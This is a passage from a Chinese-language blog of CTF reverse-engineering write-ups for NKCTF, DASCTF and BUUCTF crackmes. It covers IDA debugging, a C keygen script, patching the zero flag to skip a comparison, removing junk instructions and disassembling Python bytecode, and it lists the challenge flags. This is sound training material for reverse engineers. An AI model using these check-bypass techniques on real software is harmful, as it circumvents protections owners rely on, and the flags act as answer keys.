data-src="https://cdn.nlark.com/yuque/0/2023/png/23148330/1679151607603-fc987ea8-8d6d-4d7e-8902-3ca0208557d5.png#averageHue=%23f6f5f5&clientId=uf8617578-b3d4-4&from=paste&height=118&id=u3d96c68c&originHeight=149&originWidth=408&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=8606&status=done&style=none&taskId=ua1426408-8826-4a48-90ad-2ef526f7091&title=&width=322"                      alt="image.png"                ><br>最后脚本</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> table[<span class="number">27</span>] = <span class="string">&quot;)(*&amp;^%489$!057@#&gt;&lt;:2163qwe&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">XOR</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> ch)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">27</span>; i++)</span><br><span class="line"><span class="keyword">if</span> (table[i] == ch) </span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> arr[<span class="number">15</span>] = <span class="string">&quot;/..v4p$$!&gt;Y59-&quot;</span>;</span><br><span class="line"><span class="type">int</span> string[<span class="number">14</span>];</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) </span><br><span class="line">&#123;</span><br><span class="line">num *= <span class="number">26</span>;</span><br><span class="line">string[i] = <span class="built_in">XOR</span>(arr[i] ^ <span class="number">7</span>);</span><br><span class="line">num += string[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%lld&quot;</span>, num);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;<span class="number">2484524302484524302</span></span><br></pre></td></tr></table></figure></div><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1679153347949-a0a038cb-e35f-4208-9476-973520044f00.png"                      alt="image.png"                ><br>将数字输入之后返回正确的认证成功 即上面获得数字就是我们所要提交的flag<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1679153394509-a5a481b0-a67a-4b72-b43e-69baa28c025f.png"                      alt="image.png"                ><br>参考文章：<br><a class="link"   href="https://blog.csdn.net/OrientalGlass/article/details/129326915" >https://blog.csdn.net/OrientalGlass/article/details/129326915 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h1 id="re3车尾"><a href="#re3车尾" class="headerlink" title="re3车尾"></a>re3车尾</h1><p>上面卡在v5的输入那里，请教同学之后，可以使用动态调试将最后的结果爆破出来<br>ubantu运行.&#x2F;linux_sever64的程序，打好断点之后，Windows的ida动调程序开启<br>为了看起来比较简洁，将几个类型相同的变量组成一个新的数组<br>组成数组首先先选择最上面的变量，右键选择“Set lvar type”或者直接使用快捷键“Y”<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1679203253429-9ef95644-14f6-4dce-82ee-9052b5345752.png"                      alt="image.png"                ><br>定义好数组的名称和长度之后<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1679203296153-9448ac4e-3e3f-4c0a-acf4-948834a64b58.png"                      alt="image.png"                ><br>点击set the type 最后就好了<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1679203362994-e11139be-1877-41ab-a328-edb92a782d36.png"                      alt="image.png"                ><br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1679203406754-ed1ad3f4-288c-4e5b-9bd0-180d0012f7ce.png"                      alt="image.png"                ><br>输入00000fffff,记录每一次循环sum值<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1679206435474-560e5556-05f1-49d9-ae97-c83ac362a23b.png"                      alt="image.png"                ><br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://cdn.nlark.com/yuque/0/2023/png/23148330/1679210071031-c16cbeea-4821-4ce1-a2bf-38dd3c6222c2.png#averageHue=%23c6fcfc&clientId=u04c7bf77-de30-4&from=paste&height=358&id=u099d9675&originHeight=447&originWidth=1146&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=39356&status=done&style=none&taskId=uc38dc458-f4e0-41ad-a9d4-08c0f578fba&title=&width=916.8"                      alt="image.png"                ><br>输入00000fffff每一次循环记录  v7[0] &#x3D; 0x50;                  v9[0] &#x3D; v7[0];<br>  v7[1] &#x3D; 0xFAE3;              v9[1] &#x3D; v7[1];<br>  v7[2] &#x3D; 0xD7D3F7B;       v9[2] &#x3D; v7[2];<br>  v7[3] &#x3D; 0xA43499F6;      v9[3] &#x3D; v7[3];<br>  v7[4] &#x3D; 5;                        v9[4] &#x3D; (v7[4] &lt;&lt; 12) + v7[5];<br>  v7[5] &#x3D; 0x10;                  v9[5] &#x3D; v7[6];<br>  v7[6] &#x3D; 0xEF9;                v9[6] &#x3D; v5;<br>  v7[7]&#x3D;v5&#x3D;0xffff;</p><hr><p>i&#x3D;1<br>sum&#x3D;&#x3D;0x50;不符合sum&gt;0xFFFF；加下一个v7数组中的数据；<br>i&#x3D;2;<br>sum&#x3D;&#x3D;0xFB33&#x3D;&#x3D;0x50+0xFAE3&#x3D;&#x3D;0x50+v9[1]；<br>不符合sum&gt;0xFFFF，加下一个v7数组中的数据；<br>i&#x3D;3;<br>sum&#x3D;&#x3D;0xD7E3AAE&#x3D;&#x3D;0xFB33+0xD7D3F7B&#x3D;0x50+v9[2]；<br>符合sum&gt;0xFFFF，v7[7]取sum低四位0x3AAE；v7[8]取sum高位0xD7E；下一轮sum为v7[7]+v7[8]<br>i&#x3D;4;<br>sum&#x3D;&#x3D;0x482c&#x3D;&#x3D;v7[7]+v7[8]&#x3D;&#x3D;0x3AAE+0xD7E；<br>不符合sum&gt;0xFFFF，加下一个v7数组中的数据；<br>i&#x3D;5;<br>sum&#x3D;&#x3D;0xa434e222&#x3D;&#x3D;0x482c+0xA43499F6&#x3D;&#x3D;0x482c+v9[3]；<br>符合sum&gt;0xFFFF，v7[7]取sum低四位0xe222；v7[8]取sum高位0xa434；下一轮sum为v7[7]+v7[8]<br>i&#x3D;6;<br>sum&#x3D;&#x3D;0x18656&#x3D;&#x3D;v7[7]+v7[8]&#x3D;&#x3D;0xe222+0xa434;<br>符合sum&gt;0xFFFF，v7[7]取sum低四位0x8656；v7[8]取sum高位0x1；下一轮sum为v7[7]+v7[8]<br>i&#x3D;7;<br>sum&#x3D;&#x3D;0x8657&#x3D;&#x3D;v7[7]+v7[8]&#x3D;&#x3D;0x8656+0x1；不符合sum&gt;0xFFFF;<br>i&#x3D;8;<br>sum&#x3D;&#x3D;0xD667&#x3D;&#x3D;0x8657+0x5010&#x3D;&#x3D;0x8657+v9[4]；不符合sum&gt;0xFFFF;<br>i&#x3D;9;<br>sum&#x3D;&#x3D;0xE560&#x3D;&#x3D;0xD667+0xEF9&#x3D;&#x3D;0xD667+v9[5]；不符合sum&gt;0xFFFF;<br>sum&#x3D;0xE560+0xFFFF&#x3D;0x1e55f；<br>符合sum&gt;0xFFFF，v7[7]取sum低四位0xe55f，v7[8]取sum高位0x1，循环结束。<br>由于最后一次循环的0x1e55f是&gt;0xFFFF的，所以预测应该是返回”Error”，<br>最后返回也是“Error”即验证成功。<br>根据上面调试出来的结果，会发现一定的规律，sum是经过v7数组的元素进行相加分为两种情况<br>如果符合sum&gt;0xFFFF；v7[7]取sum低四位；v7[8]取sum剩余高位，且下一轮sum&#x3D;&#x3D;v7[7]+v7[8]；<br>如果不符合sum&gt;0xFFFF；sum+&#x3D;v9[i];<br>同时还要注意到一开始的输入格式，观察代码输入的s长度赋值给v3，长度需要大于6，查看函数中v11的值的话就会发现是之前输入的前五位“00000”，经过多次输入都是输入的前五位数字没有影响，紧接着是算出来的最小值1a9f，第十位作为校验码，多次输入后发现也是无论任意值</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;plz input the key:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line"><span class="built_in">strncpy</span>(dest, v11, v3 - <span class="number">6</span>);</span><br><span class="line">  dest[<span class="built_in">strlen</span>(s) - <span class="number">6</span>] = <span class="number">0</span>;</span><br></pre></td></tr></table></figure></div><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1679206241029-435ac6ca-f9e7-49b6-bd93-7eb3c022bb63.png"                      alt="image.png"                ><br>确定flag{1a9f}<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1679206299896-4945de50-86d4-4a25-a7cf-3c49ae00a192.png"                      alt="image.png"                ></p><h1 id="逆向5"><a href="#逆向5" class="headerlink" title="逆向5"></a>逆向5</h1><p>call_1.exe 1.dll<br>运行call_1.exe文件，一个不完整的弹窗，ida进入主函数之后发现是<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1679218710670-e4bd5340-845b-4104-b4f7-12beea8eb9bc.png"                      alt="image.png"                ><br>转化成代码语言</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>,<span class="literal">NULL</span>,错误,MB_OK);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>进入主函数发现根本没有上面推测的代码，所以说一个函数一个函数进入寻找，或者像之前的方法直接找是否存在字符串帮助更快的找到flag的线索。<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1679223727944-617580b0-5618-494c-98b1-6682adb9cab2.png"                      alt="image.png"                ><br>直到进入sub_4015BD的函数，才发现存在可疑的地方：Str&#x3D;&#x3D;“dba54edb0?d6&gt;7??3ef0f1caf2ad3102”<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1679224018583-bc3b0421-133c-4fb5-a29e-8f37c7de95cf.png#averageHue=#fbfbfa&from=url&height=215&id=TyDKf&originHeight=278&originWidth=535&originalType=binary&ratio=1.png"                                     ><br>alt+a查看是否是弹窗上的文字，根据unicode转变结果看，应该只是会用到的普通的内容性字符串<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1679223906778-c8d9975e-72a4-4237-afd3-cd392b01671c.png"                      alt="image.png"                ><br>已知Str&#x3D;&#x3D;“dba54edb0?d6&gt;7??3ef0f1caf2ad3102”,所以，很明显Str[1]!&#x3D;1,直接return result，查看sub_401520函数。<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1679224247008-a057a2f4-9c12-41b4-94e9-ad4022d94adc.png"                      alt="image.png"                ><br>line7：使用LoadLibraryA调用题目给的“1.dll”文件<br>line8：GetProcAddress(hModule, “H”) 从所给的动态链接库（1.dll）中获取函数的地址，并将其转换成一个可以在程序中调用的地址。（具体可百度）<br>for循环依次取Str里的值，作为参数传给H。sub_40163E()函数的putchar函数打印经过H处理Str[i]的内容。<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1679224751361-a3c38368-925a-4dc0-8c7b-e2d5ebf460d0.png"                      alt="image.png"                ><br>动态调试：由于Str[1]!&#x3D;1，所以程序不会执行sub_401520函数中去，那么我们就想到可以直接改ZF符号，使他表示比较的结果是相等的，即在F7单步jnz后将ZF标志的0x00改为0x01</p><blockquote><p>在汇编语言中，ZF标志经常用于比较和跳转指令中。例如，当执行cmp指令时，如果比较结果为相等，则ZF标志被置为1，程序可以根据ZF标志的值来判断跳转条件。如果ZF标志为1，则表示比较结果为相等，程序会跳转到指定位置；如果ZF标志为0，则表示比较结果不相等，程序会继续执行后续指令。</p></blockquote><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1679225078456-cc75da29-2ce6-46f3-b296-0deba0200d22.png"                      alt="image.png"                ><br>修改后进入sub_401520函数在sub_40163E函数处下断点，F9运行再F8执行sub_40163E函数，flag就出来了。<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1679223414984-d835d193-b773-4a81-8343-cc8ee68a7440.png"                      alt="image.png"                ><br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1679223396535-07cf01f7-57a2-4a33-9799-cfd8a5a79fdc.png"                      alt="image.png"                ><br>参考文章：<br><a class="link"   href="https://blog.csdn.net/weixin_45582916/article/details/118497453#5_107" >https://blog.csdn.net/weixin_45582916&#x2F;article&#x2F;details&#x2F;118497453#5_107 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a href="https://wenku.baidu.com/view/63e8de76ccc789eb172ded630b1c59eef9c79a14.html?_wkts_=1679224381727&bdQuery=GetProcAddress(hModule,+%22H%22)">https://wenku.baidu.com/view/63e8de76ccc789eb172ded630b1c59eef9c79a14.html?<em>wkts</em>&#x3D;1679224381727&amp;bdQuery&#x3D;GetProcAddress%28hModule%2C+%22H%22%29</a></p><h1 id="BUUCTF-NKCTF-4月五周"><a href="#BUUCTF-NKCTF-4月五周" class="headerlink" title="BUUCTF-NKCTF-4月五周"></a>BUUCTF-NKCTF-4月五周</h1><h3 id="earlier"><a href="#earlier" class="headerlink" title="earlier"></a>earlier</h3><p>说是手动去除花指令，得靠感觉来，首先是看这个小东西，双击到位置改一改数据，一个就是u查看数据，将第一行的数据nop掉（ctrl+N）按c再将数据整理起来，函数也是，d展开，nop第一行，c整理起来，还一个就是push ebp那里大概会有函数，p一下如果可以建个函数。<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1682255615337-bd105eba-980a-4158-890d-e721ec60729f.png"                      alt="image.png"                ></p><h1 id="DASCTF-Apr-2023-X-SU战队2023开局之战"><a href="#DASCTF-Apr-2023-X-SU战队2023开局之战" class="headerlink" title="DASCTF Apr.2023 X SU战队2023开局之战"></a>DASCTF Apr.2023 X SU战队2023开局之战</h1><h2 id="【简单】easyRE"><a href="#【简单】easyRE" class="headerlink" title="【简单】easyRE"></a>【简单】easyRE</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1682338613814-1d38cf94-03b0-4ad6-ab6d-85828642e938.png"                      alt="image.png"                ></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># visit https://tool.lu/pyc/ for more information</span><br><span class="line"># Version: Python 3.11</span><br><span class="line"></span><br><span class="line">import random</span><br><span class="line">r = random.Random(322376503)</span><br><span class="line">pt = input(&#x27;Enter your flag: &#x27;).encode()</span><br><span class="line">ct = b&#x27;%8b%cck%d3%ed%96%ffFb%06r%085%82%bc %b2%de)p%88Q`%1bf%18%b6QUSw%10%cd%d9%13A$%86%e5%cd%d9%ff&#x27;</span><br><span class="line">buf = []</span><br><span class="line"># WARNING: Decompyle incomplete</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>虽然说成功将exe文件剥离出了pyc文件，直接使用网站或者uncomply6无法直接逆向出源代码，所以使用pycdc工具来读python的字节码<a class="link"   href="https://github.com/zrax/pycdc" >https://github.com/zrax/pycdc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><div class="highlight-container" data-rel="Basic"><figure class="iseeu highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">File <span class="keyword">Name</span>: easyRE.py</span><br><span class="line">    Object <span class="keyword">Name</span>: &lt;module&gt;</span><br><span class="line">    Qualified <span class="keyword">Name</span>: &lt;module&gt;</span><br><span class="line">    Arg Count: <span class="number">0</span></span><br><span class="line">    <span class="keyword">Pos</span> Only Arg Count: <span class="number">0</span></span><br><span class="line">    KW Only Arg Count: <span class="number">0</span></span><br><span class="line">    Stack Size: <span class="number">7</span></span><br><span class="line">    Flags: <span class="number">0</span>x00000000</span><br><span class="line">    [Names]</span><br><span class="line">        <span class="comment">&#x27;random&#x27;</span></span><br><span class="line">        <span class="comment">&#x27;Random&#x27;</span></span><br><span class="line">        <span class="comment">&#x27;r&#x27;</span></span><br><span class="line">        <span class="comment">&#x27;input&#x27;</span></span><br><span class="line">        <span class="comment">&#x27;encode&#x27;</span></span><br><span class="line">        <span class="comment">&#x27;pt&#x27;</span></span><br><span class="line">        <span class="comment">&#x27;ct&#x27;</span></span><br><span class="line">        <span class="comment">&#x27;buf&#x27;</span></span><br><span class="line">        <span class="comment">&#x27;b&#x27;</span></span><br><span class="line">        <span class="comment">&#x27;append&#x27;</span></span><br><span class="line">        <span class="comment">&#x27;randint&#x27;</span></span><br><span class="line">        <span class="comment">&#x27;bytes&#x27;</span></span><br><span class="line">        <span class="comment">&#x27;print&#x27;</span></span><br><span class="line">    [Constants]</span><br><span class="line">        <span class="number">0</span></span><br><span class="line">        None</span><br><span class="line">        <span class="number">322376503</span></span><br><span class="line">        <span class="comment">&#x27;Enter your flag: &#x27;</span></span><br><span class="line">        b<span class="comment">&#x27;\x8b\xcck\xd3\xed\x96\xffFb\x06r\x085\x82\xbc \xb2\xde)p\x88Q`\x1bf\x18\xb6QUSw\x10\xcd\xd9\x13A$\x86\xe5\xcd\xd9\xff&#x27;</span></span><br><span class="line">        <span class="number">255</span></span><br><span class="line">        <span class="comment">&#x27;Correct!&#x27;</span></span><br><span class="line">    [Disassembly]</span><br><span class="line">        <span class="number">0</span>       <span class="keyword">RESUME</span>                        <span class="number">0</span></span><br><span class="line">        <span class="number">2</span>       LOAD_CONST                    <span class="number">0</span>: <span class="number">0</span></span><br><span class="line">        <span class="number">4</span>       LOAD_CONST                    <span class="number">1</span>: None</span><br><span class="line">        <span class="number">6</span>       IMPORT_NAME                   <span class="number">0</span>: random</span><br><span class="line">        <span class="number">8</span>       STORE_NAME                    <span class="number">0</span>: random</span><br><span class="line">        <span class="number">10</span>      PUSH_NULL                     </span><br><span class="line">        <span class="number">12</span>      LOAD_NAME                     <span class="number">0</span>: random</span><br><span class="line">        <span class="number">14</span>      LOAD_ATTR                     <span class="number">1</span>: Random</span><br><span class="line">        <span class="number">24</span>      LOAD_CONST                    <span class="number">2</span>: <span class="number">322376503</span></span><br><span class="line">        <span class="number">26</span>      PRECALL                       <span class="number">1</span></span><br><span class="line">        <span class="number">30</span>      <span class="keyword">CALL</span>                          <span class="number">1</span></span><br><span class="line">        <span class="number">40</span>      STORE_NAME                    <span class="number">2</span>: r</span><br><span class="line">        <span class="number">42</span>      PUSH_NULL                     </span><br><span class="line">        <span class="number">44</span>      LOAD_NAME                     <span class="number">3</span>: <span class="keyword">input</span></span><br><span class="line">        <span class="number">46</span>      LOAD_CONST                    <span class="number">3</span>: <span class="comment">&#x27;Enter your flag: &#x27;</span></span><br><span class="line">        <span class="number">48</span>      PRECALL                       <span class="number">1</span></span><br><span class="line">        <span class="number">52</span>      <span class="keyword">CALL</span>                          <span class="number">1</span></span><br><span class="line">        <span class="number">62</span>      LOAD_METHOD                   <span class="number">4</span>: encode</span><br><span class="line">        <span class="number">84</span>      PRECALL                       <span class="number">0</span></span><br><span class="line">        <span class="number">88</span>      <span class="keyword">CALL</span>                          <span class="number">0</span></span><br><span class="line">        <span class="number">98</span>      STORE_NAME                    <span class="number">5</span>: pt</span><br><span class="line">        <span class="number">100</span>     LOAD_CONST                    <span class="number">4</span>: b<span class="comment">&#x27;\x8b\xcck\xd3\xed\x96\xffFb\x06r\x085\x82\xbc \xb2\xde)p\x88Q`\x1bf\x18\xb6QUSw\x10\xcd\xd9\x13A$\x86\xe5\xcd\xd9\xff&#x27;</span></span><br><span class="line">        <span class="number">102</span>     STORE_NAME                    <span class="number">6</span>: ct</span><br><span class="line">        <span class="number">104</span>     BUILD_LIST                    <span class="number">0</span></span><br><span class="line">        <span class="number">106</span>     STORE_NAME                    <span class="number">7</span>: buf</span><br><span class="line">        <span class="number">108</span>     LOAD_NAME                     <span class="number">5</span>: pt</span><br><span class="line">        <span class="number">110</span>     GET_ITER                      </span><br><span class="line">        <span class="number">112</span>     FOR_ITER                      <span class="number">46</span> (<span class="keyword">to</span> <span class="number">206</span>)</span><br><span class="line">        <span class="number">114</span>     STORE_NAME                    <span class="number">8</span>: b</span><br><span class="line">        <span class="number">116</span>     LOAD_NAME                     <span class="number">7</span>: buf</span><br><span class="line">        <span class="number">118</span>     LOAD_METHOD                   <span class="number">9</span>: append</span><br><span class="line">        <span class="number">140</span>     LOAD_NAME                     <span class="number">2</span>: r</span><br><span class="line">        <span class="number">142</span>     LOAD_METHOD                   <span class="number">10</span>: randint</span><br><span class="line">        <span class="number">164</span>     LOAD_CONST                    <span class="number">0</span>: <span class="number">0</span></span><br><span class="line">        <span class="number">166</span>     LOAD_CONST                    <span class="number">5</span>: <span class="number">255</span></span><br><span class="line">        <span class="number">168</span>     PRECALL                       <span class="number">2</span></span><br><span class="line">        <span class="number">172</span>     <span class="keyword">CALL</span>                          <span class="number">2</span></span><br><span class="line">        <span class="number">182</span>     LOAD_NAME                     <span class="number">8</span>: b</span><br><span class="line">        <span class="number">184</span>     BINARY_OP                     <span class="number">12</span></span><br><span class="line">        <span class="number">188</span>     PRECALL                       <span class="number">1</span></span><br><span class="line">        <span class="number">192</span>     <span class="keyword">CALL</span>                          <span class="number">1</span></span><br><span class="line">        <span class="number">202</span>     POP_TOP                       </span><br><span class="line">        <span class="number">204</span>     JUMP_BACKWARD                 <span class="number">47</span></span><br><span class="line">        <span class="number">206</span>     PUSH_NULL                     </span><br><span class="line">        <span class="number">208</span>     LOAD_NAME                     <span class="number">11</span>: bytes</span><br><span class="line">        <span class="number">210</span>     LOAD_NAME                     <span class="number">7</span>: buf</span><br><span class="line">        <span class="number">212</span>     PRECALL                       <span class="number">1</span></span><br><span class="line">        <span class="number">216</span>     <span class="keyword">CALL</span>                          <span class="number">1</span></span><br><span class="line">        <span class="number">226</span>     LOAD_NAME                     <span class="number">6</span>: ct</span><br><span class="line">        <span class="number">228</span>     COMPARE_OP                    <span class="number">2</span> (==)</span><br><span class="line">        <span class="number">234</span>     POP_JUMP_FORWARD_IF_TRUE      <span class="number">2</span></span><br><span class="line">        <span class="number">236</span>     LOAD_ASSERTION_ERROR          </span><br><span class="line">        <span class="number">238</span>     RAISE_VARARGS                 <span class="number">1</span></span><br><span class="line">        <span class="number">240</span>     PUSH_NULL                     </span><br><span class="line">        <span class="number">242</span>     LOAD_NAME                     <span class="number">12</span>: <span class="keyword">print</span></span><br><span class="line">        <span class="number">244</span>     LOAD_CONST                    <span class="number">6</span>: <span class="comment">&#x27;Correct!&#x27;</span></span><br><span class="line">        <span class="number">246</span>     PRECALL                       <span class="number">1</span></span><br><span class="line">        <span class="number">250</span>     <span class="keyword">CALL</span>                          <span class="number">1</span></span><br><span class="line">        <span class="number">260</span>     POP_TOP                       </span><br><span class="line">        <span class="number">262</span>     LOAD_CONST                    <span class="number">1</span>: None</span><br><span class="line">        <span class="number">264</span>     RETURN_VALU</span><br></pre></td></tr></table></figure></div><h1 id="BUUCTF平台REVERSE刷题20230115-md"><a href="#BUUCTF平台REVERSE刷题20230115-md" class="headerlink" title="BUUCTF平台REVERSE刷题20230115.md"></a>BUUCTF平台REVERSE刷题20230115.md</h1><h2 id="reverse1"><a href="#reverse1" class="headerlink" title="reverse1"></a>reverse1</h2><p>直接快捷键shift+F12查找程序中的字符串找到类似flag的字符串<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660583388411-2e1471b1-721e-4d13-8aee-4d29e341b472.png"                      alt="图片.png"                ><br>发现填入后不对继续跟进ctrl+x<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660583449036-3039420c-436b-4fba-aa26-f16e37ddb00c.png"                      alt="图片.png"                ><br>在right flag那里看看有什么东西<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660583583458-f4f7d11f-3591-41b8-a895-2e64083692a7.png"                      alt="图片.png"                ><br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660583703521-8698f2cf-087a-4283-878f-23613ca83c6e.png"                      alt="图片.png"                ><br>看到这里是将flag中的o（ASCII的111）改为0（ASCII的48)所以得到的flag是{hell0_w0rld}<br>###flag{hell0_w0rld}</p><h3 id="利用ascii将英文字符换为数字字符"><a href="#利用ascii将英文字符换为数字字符" class="headerlink" title="利用ascii将英文字符换为数字字符"></a>利用ascii将英文字符换为数字字符</h3><h2 id="reverse2"><a href="#reverse2" class="headerlink" title="reverse2"></a>reverse2</h2><p>查看字符串shift+F12，顺着找到flag的所处位置<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660584129715-93028ff3-2ef6-4175-a8f9-0925fa864af7.png"                      alt="图片.png"                ><br><img                       lazyload                     src="/images/loading.svg"                     